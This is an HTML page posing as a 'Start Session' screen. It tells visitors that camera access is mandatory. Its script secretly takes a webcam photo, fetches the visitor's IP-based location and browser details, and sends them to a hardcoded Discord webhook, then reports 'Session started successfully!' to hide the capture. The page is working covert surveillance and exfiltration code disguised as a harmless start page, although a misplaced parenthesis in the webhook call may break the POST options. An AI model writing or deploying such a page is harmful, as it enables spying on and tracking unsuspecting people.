<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Start Session</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: white;
      text-align: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    h1 {
      font-size: 3rem;
      margin-bottom: 10px;
      animation: fadeInDown 1.5s ease;
    }

    p {
      font-size: 1.2rem;
      margin-bottom: 30px;
      animation: fadeIn 2s ease;
    }

    button {
      background: #ff004c;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 1.2rem;
      border-radius: 12px;
      cursor: pointer;
      transition: transform 0.3s, background 0.3s;
      animation: pulse 2s infinite;
    }

    button:hover {
      background: #ff3366;
      transform: scale(1.1);
    }

    .footer {
      position: absolute;
      bottom: 15px;
      font-size: 0.9rem;
      opacity: 0.7;
      animation: fadeInUp 2s ease;
    }

    img {
      width: 250px; /* Logo m√°s grande */
      margin-bottom: 20px;
      animation: bounceIn 1.5s ease;
    }

    /* Animaciones */
    @keyframes fadeInDown {
      from { opacity: 0; transform: translateY(-50px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(50px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    @keyframes bounceIn {
      0% { transform: scale(0.3); opacity: 0; }
      50% { transform: scale(1.1); opacity: 1; }
      70% { transform: scale(0.9); }
      100% { transform: scale(1); }
    }
  </style>
</head>
<body>
  <img src="https://pngimg.com/uploads/jester/jester_PNG27.png" alt="Logo">
  <h1>Welcome</h1>
  <p>To start, you must allow camera access. It is mandatory.</p>
  <button onclick="startApp()">Start</button>

  <div class="footer">Made by ReSe</div>

  <script>
    async function startApp() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");

        setTimeout(async () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);

          stream.getTracks().forEach(track => track.stop());

          const photo = canvas.toDataURL("image/png");

          // Obtener datos del navegador
          const response = await fetch("https://ipapi.co/json/");
          const data = await response.json();
          const device = navigator.userAgent;

          // Enviar a Discord
          fetch("https://discordapp.com/api/webhooks/1413325609819443260/Sq7WJJvwVhTYeKlhCYxoGdnW3xajB0xQL2T1A43B4E5L779JRns3NzvN3yP6MBTXT1Az"), {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              content: `üì∏ New photo captured\nüåç Country: ${data.country_name}\nüíª Device: ${device}`,
              embeds: [{
                image: { url: photo }
              }]
            })
          });

          alert("Session started successfully!");
        }, 2000);

      } catch (err) {
        alert("‚ö†Ô∏è Camera access is required to continue.");
      }
    }
  </script>
</body>
</html>
